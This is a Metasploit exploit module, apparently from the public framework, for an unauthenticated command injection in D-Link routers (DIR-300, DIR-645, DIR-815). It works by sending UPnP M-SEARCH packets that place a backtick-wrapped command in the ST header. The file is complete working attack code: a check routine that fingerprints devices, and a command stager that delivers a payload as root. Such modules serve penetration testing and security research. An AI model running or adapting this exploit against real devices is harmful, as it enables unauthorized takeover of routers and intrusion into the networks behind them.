##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'D-Link Unauthenticated UPnP M-SEARCH Multicast Command Injection',
      'Description' => %q{
        Different D-Link Routers are vulnerable to OS command injection via UPnP Multicast
        requests. This module has been tested on DIR-300 and DIR-645 devices. Zacharia Cutlip
        has initially reported the DIR-815 vulnerable. Probably there are other devices also
        affected.
      },
      'Author'      =>
        [
          'Zachary Cutlip', # Vulnerability discovery and initial exploit
          'Michael Messner <devnull[at]s3cur1ty.de>' # Metasploit module and verification on other routers
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['URL', 'https://github.com/zcutlip/exploit-poc/tree/master/dlink/dir-815-a1/upnp-command-injection'], # original exploit
          ['URL', 'http://shadow-file.blogspot.com/2013/02/dlink-dir-815-upnp-command-injection.html'] # original exploit
        ],
      'DisclosureDate' => 'Feb 01 2013',
      'Privileged'     => true,
      'Targets' =>
        [
          [ 'MIPS Little Endian',
            {
              'Platform' => 'linux',
              'Arch'     => ARCH_MIPSLE
            }
          ],
          [ 'MIPS Big Endian', # unknown if there are big endian devices out there
            {
              'Platform' => 'linux',
              'Arch'     => ARCH_MIPS
            }
          ]
        ],
      'DefaultTarget'  => 0
      ))

    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(1900)
      ], self.class)

    deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')
  end

  def check
    configure_socket

    pkt =
      "M-SEARCH * HTTP/1.1\r\n" +
      "Host:239.255.255.250:1900\r\n" +
      "ST:upnp:rootdevice\r\n" +
      "Man:\"ssdp:discover\"\r\n" +
      "MX:2\r\n\r\n"

    udp_sock.sendto(pkt, rhost, rport, 0)

    res = nil
    1.upto(5) do
      res,_,_ = udp_sock.recvfrom(65535, 1.0)
      break if res and res =~ /SERVER:\ Linux,\ UPnP\/1\.0,\ DIR-...\ Ver/mi
      udp_sock.sendto(pkt, rhost, rport, 0)
    end

    # UPnP response:
    # [*] 192.168.0.2:1900 SSDP Linux, UPnP/1.0, DIR-645 Ver 1.03 | http://192.168.0.2:49152/InternetGatewayDevice.xml | uuid:D02411C0-B070-6009-39C5-9094E4B34FD1::urn:schemas-upnp-org:device:InternetGatewayDevice:1
    # we do not check for the Device ID (DIR-645) and for the firmware version because there are different
    # dlink devices out there and we do not know all the vulnerable versions

    if res && res =~ /SERVER:\ Linux,\ UPnP\/1.0,\ DIR-...\ Ver/mi
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Unknown
  end

  def execute_command(cmd, opts)
    configure_socket

    pkt =
      "M-SEARCH * HTTP/1.1\r\n" +
      "Host:239.255.255.250:1900\r\n" +
      "ST:uuid:`#{cmd}`\r\n" +
      "Man:\"ssdp:discover\"\r\n" +
      "MX:2\r\n\r\n"

    udp_sock.sendto(pkt, rhost, rport, 0)
  end

  def exploit
    print_status("#{rhost}:#{rport} - Trying to access the device via UPnP ...")

    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Failed to access the vulnerable device")
    end

    print_status("#{rhost}:#{rport} - Exploiting...")
    execute_cmdstager(
      :flavor  => :echo,
      :linemax => 950
    )
  end

  # the packet stuff was taken from the module miniupnpd_soap_bof.rb
  # We need an unconnected socket because SSDP replies often come
  # from a different sent port than the one we sent to. This also
  # breaks the standard UDP mixin.
  def configure_socket
    self.udp_sock = Rex::Socket::Udp.create({
      'Context'   => { 'Msf' => framework, 'MsfExploit' => self }
    })
    add_socket(self.udp_sock)
  end

  #
  # Required since we aren't using the normal mixins
  #

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  # Accessor for our UDP socket
  attr_accessor :udp_sock

end

